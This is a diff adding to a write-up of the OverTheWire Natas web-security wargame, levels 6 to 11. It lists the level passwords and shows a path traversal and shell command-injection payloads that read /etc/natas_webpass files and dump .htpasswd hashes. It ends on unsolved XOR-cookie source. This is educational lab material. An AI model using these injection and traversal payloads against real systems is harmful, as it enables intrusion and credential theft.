@@ -274,21 +274,255 @@ $secret = "FOEIUWGHFEEUHOFUOIU";
 "Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
 ```
 
-## 
+---
+
+## Natas Level 6 → Level 7
+Username: natas7
+URL:      http://natas7.natas.labs.overthewire.org
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+```py
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+</head>
+
+<body>
+  <h1>natas7</h1>
+  <div id="content">
+  <a href="index.php?page=home">Home</a>
+  <a href="index.php?page=about">About</a>
+  <br>
+  <br>
+  this is the front page
+  <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+  </div>
+</body>
+</html>
+--------------------------------------------------------
+we can get the password from "etc/natas_webpass/natas8"
+assume this is a Directory Traversal Attack.
+--------------------------------------------------------
+Home: http://natas7.natas.labs.overthewire.org/index.php?page=home
+remove home and add "/etc/natas_webpass/natas8".
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+--------------------------------------------------------
+Home About
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+```
+
+---
+
+## Natas Level 7 → Level 8
+Username: natas8
+URL:      http://natas8.natas.labs.overthewire.org
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+```py
+--------------------------------------------------------
+View "sourcecode"
+--------------------------------------------------------
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+</head>
+
+<body>
+<h1>natas8</h1>
+<div id="content">
+<?
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print "Access granted. The password for natas9 is <censored>";
+    } else {
+    print "Wrong secret";
+    }
+}
+?>
+...
+--------------------------------------------------------
+the secret code we need is encoded.
+the “secret” entered is converted from "bin" to "hex", reversed, and then "base64 encoded".
+return bin2hex(strrev(base64_encode($secret)))
+"3d3d516343746d4d6d6c315669563362"
+
+to reverse engineer this.
+opening the console, start up PHP with "php -a".
+--------------------------------------------------------
+$ php -a
+php > echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
+oubWYf2kBq
+--------------------------------------------------------
+get the secret key oubWYf2kBq.
+got the password W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+```
+
+---
+
+## Natas Level 8 → Level 9
+Username: natas9
+URL:      http://natas9.natas.labs.overthewire.org
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+```py
+Find words containing:
+Output:
+--------------------------------------------------------
+Output:
+<pre><?
+$key = "";
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?></pre>
+--------------------------------------------------------
+type in the word “password”
+then the passthru command in the PHP script: grep -i password dictionary.txt.
+key is encapsulated in quotes, no input filtering, able to enter special characters.
+--------------------------------------------------------
+use the ";" command separator to use 2 commands in one line.
+use the "#" command, comment out the rest of the text following the symbol.
+
+in the input field type
+"; cat /etc/natas_webpass/natas10 #"
+in turn will run the passthru command as such;
+"grep -i ; cat /etc/natas_webpass/natas10 #, commenting out and removing dictionary.txt."
+--------------------------------------------------------
+Output:
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+--------------------------------------------------------
+```
+
+---
+
+## Natas Level 9 → Level 10
+Username: natas10
+URL:      http://natas10.natas.labs.overthewire.org
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+```py
+For security reasons, we now filter on certain characters
+Find words containing:
+Output:
+--------------------------------------------------------
+Output:
+<pre><?
+$key = "";
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+if($key != "") {
+    if(preg_match('/ [;|&] /',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?></pre>
+--------------------------------------------------------
+now they are filtering the ; and & command.
+but they still haven’t fixed the way “key” is storing input.
+exploit this the same way we did in 9; but this time just using regular expressions.
+
+enter ".* /etc/natas_webpass/natas11 #"
+".*" : tell grep to search for all, while ignoring case, and match it to etc/natas_webpass/natas11.
+"#" : comments out dictionary.txt, preventing any errors from occurring.
+--------------------------------------------------------
+Output:
+.htaccess:AuthType Basic
+.htaccess: AuthName "Authentication required"
+.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
+.htaccess: require valid-user
+.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
+.htpasswd:natas10:$1$mRklUuvs$D4FovAtQ6y2mb5vXLAy.P/
+.htpasswd:natas10:$1$SpbdWYWN$qM554rKY7WrlXF5P6ErYN/
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+```
+---
+
+## Natas Level 10 → Level 11
+Username: natas11
+URL:      http://natas11.natas.labs.overthewire.org
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 
 
+```py
+--------------------------------------------------------
+Cookies are protected with XOR encryption
+Background color:
+#ffffff
+--------------------------------------------------------
+<?
+$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
 
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+    return $outText;
+}
 
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
 
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
 
+$data = loadData($defaultdata);
 
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
 
+saveData($data);
 
+?>
 
+<h1>natas11</h1>
+<div id="content">
+<body style="background: <?=$data['bgcolor']?>;">
+Cookies are protected with XOR encryption<br/><br/>
 
+<?
+if($data["showpassword"] == "yes") {
+    print "The password for natas12 is <censored><br>";
+}
+?>
 
+<form>
+Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
+<input type=submit value="Set color">
+</form>
 
-
+```
 
 
 
